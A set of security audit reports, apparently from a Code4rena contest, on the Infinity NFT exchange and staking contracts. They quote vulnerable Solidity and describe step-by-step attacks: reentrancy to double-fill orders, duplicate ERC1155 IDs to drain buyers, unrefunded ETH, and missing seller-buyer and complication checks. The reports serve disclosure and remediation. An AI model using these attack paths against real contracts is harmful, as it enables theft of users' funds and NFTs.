https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L68-L116  ```solidity function canExecMatchOneToMany(     OrderTypes.MakerOrder calldata makerOrder,     OrderTypes.MakerOrder[] calldata manyMakerOrders   ) external view override returns (bool) {     uint256 numItems;     bool isOrdersTimeValid = true;     bool itemsIntersect = true;     uint256 ordersLength = manyMakerOrders.length;     for (uint256 i = 0; i < ordersLength; ) {       if (!isOrdersTimeValid || !itemsIntersect) {         return false; // short circuit       }        uint256 nftsLength = manyMakerOrders[i].nfts.length;       for (uint256 j = 0; j < nftsLength; ) {         numItems += manyMakerOrders[i].nfts[j].tokens.length;         unchecked {           ++j;         }       }        isOrdersTimeValid =         isOrdersTimeValid &&         manyMakerOrders[i].constraints[3] <= block.timestamp &&         manyMakerOrders[i].constraints[4] >= block.timestamp;        itemsIntersect = itemsIntersect && doItemsIntersect(makerOrder.nfts, manyMakerOrders[i].nfts);        unchecked {         ++i;       }     }      bool _isTimeValid = isOrdersTimeValid &&       makerOrder.constraints[3] <= block.timestamp &&       makerOrder.constraints[4] >= block.timestamp;      uint256 currentMakerOrderPrice = _getCurrentPrice(makerOrder);     uint256 sumCurrentOrderPrices = _sumCurrentPrices(manyMakerOrders);      bool _isPriceValid = false;     if (makerOrder.isSellOrder) {       _isPriceValid = sumCurrentOrderPrices >= currentMakerOrderPrice;     } else {       _isPriceValid = sumCurrentOrderPrices <= currentMakerOrderPrice;     }      return (numItems == makerOrder.constraints[0]) && _isTimeValid && itemsIntersect && _isPriceValid;   } ```  However, because `buy.nfts` is used as `OrderItem` to transfer the nfts from seller to buyer, and there are no tokenIds specified in the matched maker buy order, the buyer wont receive any nft (`_transferERC721s` does nothing, 0 transfers) despite the buyer paid full in price.  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L763-L786  ```solidity function _execMatchOneMakerSellToManyMakerBuys(     bytes32 sellOrderHash,     bytes32 buyOrderHash,     OrderTypes.MakerOrder calldata sell,     OrderTypes.MakerOrder calldata buy,     uint256 startGasPerOrder,     uint256 execPrice,     uint16 protocolFeeBps,     uint32 wethTransferGasUnits,     address weth   ) internal {     isUserOrderNonceExecutedOrCancelled[buy.signer][buy.constraints[5]] = true;     uint256 protocolFee = (protocolFeeBps * execPrice) / 10000;     uint256 remainingAmount = execPrice - protocolFee;     _execMatchOneToManyOrders(sell.signer, buy.signer, buy.nfts, buy.execParams[1], remainingAmount);     _emitMatchEvent(       sellOrderHash,       buyOrderHash,       sell.signer,       buy.signer,       buy.execParams[0],       buy.execParams[1],       execPrice     ); ```  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1080-L1092  ```solidity function _transferERC721s(     address from,     address to,     OrderTypes.OrderItem calldata item   ) internal {     uint256 numTokens = item.tokens.length;     for (uint256 i = 0; i < numTokens; ) {       IERC721(item.collection).safeTransferFrom(from, to, item.tokens[i].tokenId);       unchecked {         ++i;       }     }   } ```   ### PoC  1. Alice signed and submitted a maker buy order #1, to buy `2` Punk with `2 WETH` and specified tokenIds = `1`,`2` 2. Bob signed and submitted a maker buy order #2, to buy `1` Punk with `1 WETH` and with no specified tokenIds. 3. Charlie signed and submitted a maker sell order #3, ask for `3 WETH` for `2` Punk and specified tokenIds = `1`,`2` 4. The match executor called `matchOneToManyOrders()` match Charlie's sell order #3 with buy order #1 and #2, Alice received `2` Punk, Charlie received `3 WETH`, Bob paid `1 WETH` and get nothing in return.  ### Recommendation  Change to:  ```solidity function canExecMatchOneToMany(     OrderTypes.MakerOrder calldata makerOrder,     OrderTypes.MakerOrder[] calldata manyMakerOrders   ) external view override returns (bool) {     uint256 numItems;     uint256 numConstructedItems;     bool isOrdersTimeValid = true;     bool itemsIntersect = true;     uint256 ordersLength = manyMakerOrders.length;     for (uint256 i = 0; i < ordersLength; ) {       if (!isOrdersTimeValid || !itemsIntersect) {         return false; // short circuit       }        numConstructedItems += manyMakerOrders[i].constraints[0];        uint256 nftsLength = manyMakerOrders[i].nfts.length;       for (uint256 j = 0; j < nftsLength; ) {         numItems += manyMakerOrders[i].nfts[j].tokens.length;         unchecked {           ++j;         }       }        isOrdersTimeValid =         isOrdersTimeValid &&         manyMakerOrders[i].constraints[3] <= block.timestamp &&         manyMakerOrders[i].constraints[4] >= block.timestamp;        itemsIntersect = itemsIntersect && doItemsIntersect(makerOrder.nfts, manyMakerOrders[i].nfts);        unchecked {         ++i;       }     }      bool _isTimeValid = isOrdersTimeValid &&       makerOrder.constraints[3] <= block.timestamp &&       makerOrder.constraints[4] >= block.timestamp;      uint256 currentMakerOrderPrice = _getCurrentPrice(makerOrder);     uint256 sumCurrentOrderPrices = _sumCurrentPrices(manyMakerOrders);      bool _isPriceValid = false;     if (makerOrder.isSellOrder) {       _isPriceValid = sumCurrentOrderPrices >= currentMakerOrderPrice;     } else {       _isPriceValid = sumCurrentOrderPrices <= currentMakerOrderPrice;     }      return (numItems == makerOrder.constraints[0]) && (numConstructedItems == numItems) && _isTimeValid && itemsIntersect && _isPriceValid;   } ```  
# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L119-L121 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1228-L1232   # Vulnerability details  `InfinityExchange` accepts payments in native ETH, but does not return overpayments to the buyer. Overpayments are likely in the case of auction orders priced in native ETH.  In the case of a Dutch or reverse Dutch auction priced in native ETH, the end user is likely to send more ETH than the final calculated price in order to ensure their transaction succeeds, since price is a function of `block.timestamp`, and the user cannot predict the timestamp at which their transaction will be included.   In a Dutch auction, final price may decrease below the calculated price at the time the transaction is sent. In a reverse Dutch auction, the price may increase above the calculated price by the time a transaction is included, so the buyer is incentivized to provide additional ETH in case the price rises while their transaction is waiting for inclusion.  The `takeOrders` and `takeMultipleOneOrders` functions both check that the buyer has provided an ETH amount greater than or equal to the total price at the time of execution:  [`InfinityExchange#takeOrders`](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L359-L363)  ```solidity     // check to ensure that for ETH orders, enough ETH is sent     // for non ETH orders, IERC20 safeTransferFrom will throw error if insufficient amount is sent     if (isMakerSeller && currency == address(0)) {       require(msg.value >= totalPrice, 'invalid total price');     } ```  [`InfinityExchange#takeMultipleOneOrders`](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L323-L327)  ```solidity     // check to ensure that for ETH orders, enough ETH is sent     // for non ETH orders, IERC20 safeTransferFrom will throw error if insufficient amount is sent     if (isMakerSeller && currency == address(0)) {       require(msg.value >= totalPrice, 'invalid total price');     } ```  However, neither of these functions refunds the user in the case of overpayment. Instead, overpayment amounts will accrue in the contract balance.  Moreover, since there is a bug in `rescueETH` that prevents ether withdrawals from `InfinityExchange`, these overpayments will be locked permanently: the owner cannot withdraw and refund overpayments manually.  Scenario: - Alice creates a sell order for her token with constraints that set up a reverse Dutch auction: start price `500`, end price `2000`, start time `1`, end time `5`. - Bob fills the order at time `2`. The calculated price is `875`. Bob is unsure when his transaction will be included, so provides a full `2000` wei payment. - Bob's transaction is included at time `3`. The calculated price is `1250`. - Bob's additional `750` wei are locked in the contract and not refunded.  Suggestion: Calculate and refund overpayment amounts to callers.  
# Summary  We list 2 low-critical findings: * (Low) Misunderstanding params * (Low) `takeMultipleOneOrders` doesn’t check nfts length  # (Low) Misunderstanding params  ## Impact  `constraints` in struct MakerOrder is an array which is easily misused.  ## Proof of Concept  It hard coded a number to indicate an element in `constraints` array:  https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L515-L516  ```     bool orderExpired = isUserOrderNonceExecutedOrCancelled[order.signer][order.constraints[5]] ||       order.constraints[5] < userMinOrderNonce[order.signer]; ```  ## Tools Used  None  ## Recommended Mitigation Steps  Consider to define variables rather than `constraints` array, or use constraint index to indicate:  ```     enum CONSTRAINT_INDEX {         numItems,         startPrice,         endPrice,         startTime,         endTime,         nonce     } ```  # (Low) `takeMultipleOneOrders` doesn’t check nfts length  ## Impact  In `matchOneToOneOrders`, it checks that the `nfts` of orders must be 1: https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityOrderBookComplication.sol#L32-L37  But in `takeMultipleOneOrders`, it doesn’t check that the `nfts` of orders must be 1, and the comment says: Batch buys or sells orders with specific `1` NFTs.  ## Tools Used  None  ## Recommended Mitigation Steps  Also check nfts length in `​​takeMultipleOneOrders`. 
# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L178 https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L216 https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L230   # Vulnerability details  `matchOneToManyOrders` doesn't conform to Checks-Effects-Interactions pattern, and updates the maker order nonce only after the NFTs and payment have been sent. Using this, a malicious user can re-enter the contract and re-fulfill the order using `takeOrders`.  ## Impact Orders can be executed twice. User funds would be lost.  ## Proof of Concept `matchOneToManyOrders` will set the order nonce as used only after the tokens are being sent: ```   function matchOneToManyOrders(OrderTypes.MakerOrder calldata makerOrder, OrderTypes.MakerOrder[] calldata manyMakerOrders) external {     ...     if (makerOrder.isSellOrder) {       for (uint256 i = 0; i < ordersLength; ) {         ...         _matchOneMakerSellToManyMakerBuys(...); // @audit will transfer tokens in here         ...       }       //@audit setting nonce to be used only here       isUserOrderNonceExecutedOrCancelled[makerOrder.signer][makerOrder.constraints[5]] = true;     } else {       for (uint256 i = 0; i < ordersLength; ) {         protocolFee += _matchOneMakerBuyToManyMakerSells(...); // @audit will transfer tokens in here         ...       }       //@audit setting nonce to be used only here       isUserOrderNonceExecutedOrCancelled[makerOrder.signer][makerOrder.constraints[5]] = true;       ...   } ```  So we can see that tokens are being transferred before nonce is being set to executed.  Therefore, POC for an attack - Alice wants to buy 2 unspecified WolfNFT, and she will pay via AMP, an ERC-777 token. Malicious user Bob will set up an offer to sell 2 WolfNFT. The MATCH_EXECUTOR will match the offers. Bob will set up a contract such that upon receiving of AMP, it will call [`takeOrders`](https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L336) with Alice's order, and 2 other WolfNFTs. (Note that although `takeOrders` is `nonReentrant`, `matchOneToManyOrders` is not, and so the reentrancy will succeed.)  So in `takeOrders`, the contract will match Alice's order with Bob's NFTs, and then set Alice's order's nonce to true, then `matchOneToManyOrders` execution will resume, and again will set Alice's order's nonce to true.  Alice ended up buying 4 WolfNFTs although she only signed an order for 2. Tough luck, Alice.  (Note: a similar attack can be constructed via ERC721's onERC721Received.)  ## Recommended Mitigation Steps Conform to CEI and set the nonce to true before executing external calls.  
# Lines of code  https://github.com/infinitydotxyz/exchange-contracts-v2/blob/c51b7e8af6f95cc0a3b5489369cbc7cee060434b/contracts/core/InfinityOrderBookComplication.sol#L205   # Vulnerability details  ## Impact  Function `matchOrders` uses custom constraints to make the matching more flexible, allow seller/buyer to specify maximum/minimum number of NFTs they want to sell/buy. This function first does some checks and then execute matching.  But in [function](https://github.com/infinitydotxyz/exchange-contracts-v2/blob/c51b7e8af6f95cc0a3b5489369cbc7cee060434b/contracts/core/InfinityOrderBookComplication.sol#L192) `areNumItemsValid()`, there is a wrong checking will lead to wrong logic in `matchOrders()` function.  Instead of checking if `numConstructedItems <= sell.constraints[0]` or not, function `areNumItemsValid()` check if `buy.constraints[0] <= sell.constraints[0]`. It will lead to the scenario that `numConstructedItems > sell.constraints[0]` and make the seller sell more number of nfts than he/she allow.    ## Proof of concept   Consider the scenario 1. Alice create a sell order to sell maximum 2 in her 3 BAYC with ids `[1, 2, 3]`  2. Bob create a buy order to buy mimimum any 2 BAYC with id in list `[1, 2, 3]` 3. Match executor call `matchOrders()` to match Alice's order and Bob's one with parameter `constructs = [1, 2, 3]`  4. Function `matchOrders` will transfer all NFT in `construct` list (3 NFTs `1, 2, 3`) from seller to buyer even though seller only want to sell maximum 2 NFTs.  For more information, please check this PoC.  https://gist.github.com/minhquanym/a95c8652de8431c5d1d24aa4076a1878           ## Tools Used  hardhat, chai      ## Recommended Mitigation Steps  Replace check `buy.constraints[0] <= sell.constraints[0]` with `numConstructedItems <= sell.constraints[0]`  
# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L271-L312 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L59-L116 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L245-L294 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L118-L143 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L330-L364 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L934-L951 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L145-L164 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L171-L243   # Vulnerability details  ## Impact Function `matchOneToManyOrders()` and `takeOrders()` and `matchOrders()` suppose to match `sell order` to `buy order` and should perform some checks to ensure that user specified parameters in orders which are signed are not violated when order matching happens. but There is no check in their execution flow to check that an `order` has different `NFT token ids` in each one of it's collections, so even so number of tokens could be valid in `order` to `order` transfer but the number of real transferred tokens and their IDs can be different than what user specified and signed. and user funds would be lost. (because of `ERC1155` there can be more than one token for a `tokenId`, so it would be possible to transfer it)  ## Proof of Concept This is `_takeOrders()` and `` and `` code: ```   /**    * @notice Internal helper function to take orders    * @dev verifies whether order can be executed    * @param makerOrder the maker order    * @param takerItems nfts to be transferred    * @param execPrice execution price    */   function _takeOrders(     OrderTypes.MakerOrder calldata makerOrder,     OrderTypes.OrderItem[] calldata takerItems,     uint256 execPrice   ) internal {     bytes32 makerOrderHash = _hash(makerOrder);     bool makerOrderValid = isOrderValid(makerOrder, makerOrderHash);     bool executionValid = IComplication(makerOrder.execParams[0]).canExecTakeOrder(makerOrder, takerItems);     require(makerOrderValid && executionValid, 'order not verified');     _execTakeOrders(makerOrderHash, makerOrder, takerItems, makerOrder.isSellOrder, execPrice);   } ``` As you can see it uses `canExecTakeOrder()` to check that it is valid to perform matching. This is `canExecTakeOrder()` and `areTakerNumItemsValid()` and `doTokenIdsIntersect()` code which are used in execution flow to check orders and matching validity: ```   /**    * @notice Checks whether take orders with a higher order intent can be executed    * @dev This function is called by the main exchange to check whether take orders with a higher order intent can be executed.           It checks whether orders have the right constraints - i.e they have the right number of items, whether time is still valid           and whether the nfts intersect    * @param makerOrder the maker order    * @param takerItems the taker items specified by the taker    * @return returns whether order can be executed    */   function canExecTakeOrder(OrderTypes.MakerOrder calldata makerOrder, OrderTypes.OrderItem[] calldata takerItems)     external     view     override     returns (bool)   {     return (makerOrder.constraints[3] <= block.timestamp &&       makerOrder.constraints[4] >= block.timestamp &&       areTakerNumItemsValid(makerOrder, takerItems) &&       doItemsIntersect(makerOrder.nfts, takerItems));   }    /// @dev sanity check to make sure that a taker is specifying the right number of items   function areTakerNumItemsValid(OrderTypes.MakerOrder calldata makerOrder, OrderTypes.OrderItem[] calldata takerItems)     public     pure     returns (bool)   {     uint256 numTakerItems = 0;     uint256 nftsLength = takerItems.length;     for (uint256 i = 0; i < nftsLength; ) {       unchecked {         numTakerItems += takerItems[i].tokens.length;         ++i;       }     }     return makerOrder.constraints[0] == numTakerItems;   }    /**    * @notice Checks whether tokenIds intersect    * @dev This function checks whether there are intersecting tokenIds between two order items    * @param item1 first item    * @param item2 second item    * @return returns whether tokenIds intersect    */   function doTokenIdsIntersect(OrderTypes.OrderItem calldata item1, OrderTypes.OrderItem calldata item2)     public     pure     returns (bool)   {     uint256 item1TokensLength = item1.tokens.length;     uint256 item2TokensLength = item2.tokens.length;     // case where maker/taker didn't specify any tokenIds for this collection     if (item1TokensLength == 0 || item2TokensLength == 0) {       return true;     }     uint256 numTokenIdsPerCollMatched = 0;     for (uint256 k = 0; k < item2TokensLength; ) {       for (uint256 l = 0; l < item1TokensLength; ) {         if (           item1.tokens[l].tokenId == item2.tokens[k].tokenId && item1.tokens[l].numTokens == item2.tokens[k].numTokens         ) {           // increment numTokenIdsPerCollMatched           unchecked {             ++numTokenIdsPerCollMatched;           }           // short circuit           break;         }         unchecked {           ++l;         }       }       unchecked {         ++k;       }     }      return numTokenIdsPerCollMatched == item2TokensLength;   } ``` As you can see there is no logic to check that `token IDs` in one collection of order are different and code only checks that total number of tokens in one `order` matches the number of tokens specified and the ids in one order exists in other list defined. function `doTokenIdsIntersect()` checks to see that `tokens ids` in one collection can match list of specified tokens. because of this check lacking there are some scenarios that can cause fund lose for `ERC1155` tokens (normal `ERC721` requires more strange conditions). here is first example:  1. for simplicity let's assume collection and timestamp are valid and match for orders and token is `ERC1155` 2. `user1` has signed this order: A:`(user1 BUY 3 NFT IDs[(1,1),(2,1),(3,1)] at 15 ETH)` (buy `1` token of each `id=1,2,3`) 3. `NFT ID[1]` fair price is `1 ETH`, `NFT ID[2]` fair price is `2 ETH`, `NFT ID[3]` fair price is `12 ETH` 4. `attacker` who has 3 of `NFT ID[1]` create this list: B:`(NFT IDs[(1,1), (1,1), (1,1)] )` (list to trade `1`token of `id=1` for 3 times) 5. attacker call `takeOrders()` with this parameters: makerOrder: A , takerNfts: B 6. contract logic would check all the conditions and validate and verify orders and their matching (they intersect and total number of token to sell is equal to total number of tokens to buy and all of the B list is inside A list) and perform the transaction. 7. `attacker` would receive `15 ETH` for his 3 token of `NFT ID[1]` and steal `user1` funds. `user1` would receive 3 of `NFT ID[1]` and pays `15 ETH` and even so his order A has been executed he doesn't receive `NFT IDs[(2,1),(3,1)]` and contract would violates his signed parameters.  This examples shows that in verifying one to many order code should verify that one order's one  collection's token ids are not duplicates. (the function `doTokenIdsIntersect()` doesn't check for this).  This scenario is performable to `matchOneToManyOrders()` and `matchOrders()` and but exists in their code (related check logics) too. more important things about this scenario is that it doesn't require off-chain maching engine to make mistake or malicious act, anyone can call `takeOrders()` if NFT tokens are `ERC1155`. for other `NFT` tokens to perform this attack it requires that `seller==buyer` or some other strange cases (like auto selling when receiving in one contract).  ## Tools Used VIM  ## Recommended Mitigation Steps add checks to ensure `order`'s one `collection`'s token ids are not duplicate in `doTokenIdsIntersect()`  
# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L125-L364   # Vulnerability details  ## Impact Functions `matchOneToOneOrders()`, `matchOneToManyOrders()`, `matchOrders()`, `takeMultipleOneOrders()`, `takeOrders()` are for order matching and order execution and they validate different things about orders but there is no check for that `seller != buyer`, which can cause wrong order matching resulting in fund lose or fund theft or griefing. (it can be combined with other vulns to perform more damaging attacks)  ## Proof of Concept We only give proof of concept for `matchOneToManyOrders()` and other order execution/matching functions has similar bugs which root cause is not checking `seller != buyer`. This is `matchOneToManyOrders()` code: ```   /**    @notice Matches one  order to many orders. Example: A buy order with 5 specific NFTs with 5 sell orders with those specific NFTs.    @dev Can only be called by the match executor. Refunds gas cost incurred by the         match executor to this contract. Checks whether the given complication can execute the match.    @param makerOrder The one order to match    @param manyMakerOrders Array of multiple orders to match the one order against   */   function matchOneToManyOrders(     OrderTypes.MakerOrder calldata makerOrder,     OrderTypes.MakerOrder[] calldata manyMakerOrders   ) external {     uint256 startGas = gasleft();     require(msg.sender == MATCH_EXECUTOR, 'OME');     require(_complications.contains(makerOrder.execParams[0]), 'invalid complication');     require(       IComplication(makerOrder.execParams[0]).canExecMatchOneToMany(makerOrder, manyMakerOrders),       'cannot execute'     );     bytes32 makerOrderHash = _hash(makerOrder);     require(isOrderValid(makerOrder, makerOrderHash), 'invalid maker order');     uint256 ordersLength = manyMakerOrders.length;     // the below 3 variables are copied to memory once to save on gas     // an SLOAD costs minimum 100 gas where an MLOAD only costs minimum 3 gas     // since these values won't change during function execution, we can save on gas by copying them to memory once     // instead of SLOADing once for each loop iteration     uint16 protocolFeeBps = PROTOCOL_FEE_BPS;     uint32 wethTransferGasUnits = WETH_TRANSFER_GAS_UNITS;     address weth = WETH;     if (makerOrder.isSellOrder) {       for (uint256 i = 0; i < ordersLength; ) {         // 20000 for the SSTORE op that updates maker nonce status from zero to a non zero status         uint256 startGasPerOrder = gasleft() + ((startGas + 20000 - gasleft()) / ordersLength);         _matchOneMakerSellToManyMakerBuys(           makerOrderHash,           makerOrder,           manyMakerOrders[i],           startGasPerOrder,           protocolFeeBps,           wethTransferGasUnits,           weth         );         unchecked {           ++i;         }       }       isUserOrderNonceExecutedOrCancelled[makerOrder.signer][makerOrder.constraints[5]] = true;     } else {       uint256 protocolFee;       for (uint256 i = 0; i < ordersLength; ) {         protocolFee += _matchOneMakerBuyToManyMakerSells(           makerOrderHash,           manyMakerOrders[i],           makerOrder,           protocolFeeBps         );         unchecked {           ++i;         }       }       isUserOrderNonceExecutedOrCancelled[makerOrder.signer][makerOrder.constraints[5]] = true;       uint256 gasCost = (startGas - gasleft() + WETH_TRANSFER_GAS_UNITS) * tx.gasprice;       // if the execution currency is weth, we can send the protocol fee and gas cost in one transfer to save gas       // else we need to send the protocol fee separately in the execution currency       // since the buyer is common across many sell orders, this part can be executed outside the above for loop       // in contrast to the case where if the one order is a sell order, we need to do this in each for loop       if (makerOrder.execParams[1] == weth) {         IERC20(weth).safeTransferFrom(makerOrder.signer, address(this), protocolFee + gasCost);       } else {         IERC20(makerOrder.execParams[1]).safeTransferFrom(makerOrder.signer, address(this), protocolFee);         IERC20(weth).safeTransferFrom(makerOrder.signer, address(this), gasCost);       }     }   } ``` in its executions it calls `InfinityOrderBookComplication.canExecMatchOneToMany()`, `verifyMatchOneToManyOrders()`, `isOrderValid()` to see that if orders are valid and one order matched to all other orders but there is no check for `seller != buyer` in any of those functions. and also `ERC721` and `ERC20` allows funds and assets to be transferred from address to itself. So it's possible for `matchOneToManyOrders()` to match one user sell orders to its buy orders which can cause fund theft or griefing. This is the scenario for fund lose in `matchOneToManyOrders()`: 1. let's assume orders `NFT` ids are for one collection for simplicity. 2. `NFT ID[1]` fair price is `8 ETH` and `NFT ID[2]` fair price is `2 ETH`. 3. `user1` wants to buy `NFT IDs[1,2]` at `10 ETH` (both of them) so he create one buy order and signs it. 4. `user1` wants to sell `NFT ID[1]` at `2.5 ETH` and sell `NFT ID[2]` at `8.5 ETH`. and he wants to sell them immediately after buying them so he create this two sell orders and sign them. 5. `attacker` who has `NFT ID[1]` creates an sell order for it at `7.5 ETH` and signs it. 6. off-chain machining engine sends this orders to `matchOneToManyOrders()`: many orders = [`(attacker sell ID[1] at 7.5 ETH)` , `(user1 sell ID[1] at 2.5 ETH)`] , one order = `(user1 buy IDs[1,2] at 10ETH)` 7. function `matchOneToManyOrders()` logic will check orders and their matching and all the checks would be passed for matching one order to many order(becase tokens lists intersects and numTokens are valids too (`1+1=2`)) 8. function `matchOneToManyOrders()` would execute order and transfer funds and tokens which would result in: (transferring `7.5 ETH` from `user 1` to `attacker`) (transferring `2.5 ETH` from `user1` to `user1`) (transferring `NFT ID[1]` from `attacker` to `user1`) (transferring `NFT ID[1]` from `user1` to `user1`) 9. so in the end contract executed `user1` buy order `(user1 buy IDs[1,2] at 10ETH)` but `user` only received `NFT ID[1]` and didn't received `NFT ID[2]` so contract code perform operation contradiction to what `user1` has been signed.  Of course for this attack to work for `matchOneToManyOrders()` off-chain matching engine need to send wrong data but checks on the contract are not enough.  There are other scenarios for other functions that can cause griefing, for example for function `matchOrders()`: a user can have multiple order to buy some tokens in list of ids. it's possible to match these old orders: 1. `user1` has this order: A:`(user1 BUY 1 of IDs[1,2,3])` and  B:`(user1 BUY 1 of IDs[1,4,5])`  2. then the order B get executed for ID[1] and `user1` become the owner of `ID[1]` 3. `user1` wants to sell some of his tokens so he signs this order: C::`(user1 SELL 1 of IDs[1,6,7])` 4. matching engine would send order A and C with `constructedNfts=ID[1]` to `matchOrders()`. 5. `matchOrders()` would check conditions and would see that conditions are met and perform the transaction. 6. `user1` would pay some unnecessary order fee and it would become like griefing and DOS attack for him.  There may be other scenarios for this vuln to be harmful for users.  ## Tools Used VIM  ## Recommended Mitigation Steps add some checks to ensure that `seller != buyer`   
# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L300-L328   # Vulnerability details  An order's type and it's rules are defined in it's `Complication`. Not checking it would allow anyone to take any orders regardless of their Complication's rule, causing unexpected execution for order makers.  `takeMultipleOneOrders` assumes that all `makerOrders` are simple orderbook orders and the  Complication check is missing here.  #### Proof of Concept - Alice signs a makerOrder with `PrivateSaleComplication`, allowing only Bob to take the private sale order. - A malicious trader calls `takeMultipleOneOrders` to take Alice's order, despite the Complication only allowing Bob to take it.  #### Recommended Mitigation Steps Add `canExecTakeOneOrder` function in IComplication.sol and implement it in `InfinityOrderBookComplication` (and future Complications) to support `takeMultipleOneOrders` operation, then modify `takeMultipleOneOrders` to use the check: ``` function takeMultipleOneOrders() {     ...     for (uint256 i = 0; i < numMakerOrders; ) {         bytes32 makerOrderHash = _hash(makerOrders[i]);         bool makerOrderValid = isOrderValid(makerOrders[i], makerOrderHash);         bool executionValid = IComplication(makerOrders[i].execParams[0]).canExecTakeOneOrder(makerOrders[i]);                  require(makerOrderValid && executionValid, 'order not verified');                  require(currency == makerOrders[i].execParams[1], 'cannot mix currencies');         require(isMakerSeller == makerOrders[i].isSellOrder, 'cannot mix order sides');         uint256 execPrice = _getCurrentPrice(makerOrders[i]);         totalPrice += execPrice; // @audit-issue missing complication check         _execTakeOneOrder(makerOrderHash, makerOrders[i], isMakerSeller, execPrice);         unchecked {             ++i;         }     }     ... } ```  
# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L67 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L86-L90 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L116    # Vulnerability details  ## Impact `InfinityStaker.sol` implemented Pausable contract, but there's no functionality added to `pause` and `unpause` the contract. If any attacker finds a way to exploit the contract and it's funds, at that time it will not let you pause the contract and funds can be lost.  ## Proof of Concept `InfinityStaker.sol` inhereted `Pausable.sol` of `Openzeppelin` and used `whenNotPaused` modifier for `stake()`, `unstake()` and `changeDuration()`,        function _pause() internal virtual whenNotPaused {         _paused = true;         emit Paused(_msgSender());      }   `_pause()` and `_unpause()` function of `Pausable.sol` used to `pause` and `unpause` the contract respectively and both has `internal` visibility, to use these functions it needs to access from the `infinityStaker.sol` internally.  ## Tools Used Manual Analysis  ## Recommended Mitigation Steps add `pause` and `unpause` the contract function to `InfinityStaker.sol`  
# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityOrderBookComplication.sol#L140   # Vulnerability details  ## Impact canExecMatchOrder is having an incorrect check which makes a valid order as invalid. doItemsIntersect function is also checked on sell.nfts, buy.nfts which is incorrect. doItemsIntersect should only be checked in reference to constructedNfts  ## Proof of Concept 1. Assume buy has nfts {A,B,C}, sell has nft {A,B}, constructedNfts has nft {A}, buy.constraints[0]/sell.constraints[0]/numConstructedItems is 1  2. Ideally this order should match since constructedNfts {A} is present in both buy and sell  3. But this will not match since doItemsIntersect(sell.nfts, buy.nfts) will fail because of item C which is not present in sell  ## Recommended Mitigation Steps Remove doItemsIntersect(sell.nfts, buy.nfts) from InfinityOrderBookComplication.sol#L140  
# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L287-L325   # Vulnerability details  ## Impact function `_updateUserStakedAmounts()` is supposed to update user staked amounts and it sets `userstakedAmounts[user][].timestamp=0` when `userstakedAmounts[user][].amount` is `0x0`. but there are some cases that code logic don't handle them and `amount` become `0x0` and code don't set `timestamp` to `0x0`. so any logic that is depended on `timestamp==0` when `amount==0` could fail, to my understanding setting `timestamp` is for gas efficiency.  ## Proof of Concept This is `_updateUserStakedAmounts()` code: ```   /** @notice Update user staked amounts for different duration on unstake     * @dev A more elegant recursive function is possible but this is more gas efficient    */   function _updateUserStakedAmounts(     address user,     uint256 amount,     uint256 noVesting,     uint256 vestedThreeMonths,     uint256 vestedSixMonths,     uint256 vestedTwelveMonths   ) internal {     if (amount > noVesting) {       userstakedAmounts[user][Duration.NONE].amount = 0;       userstakedAmounts[user][Duration.NONE].timestamp = 0;       amount = amount - noVesting;       if (amount > vestedThreeMonths) {         userstakedAmounts[user][Duration.THREE_MONTHS].amount = 0;         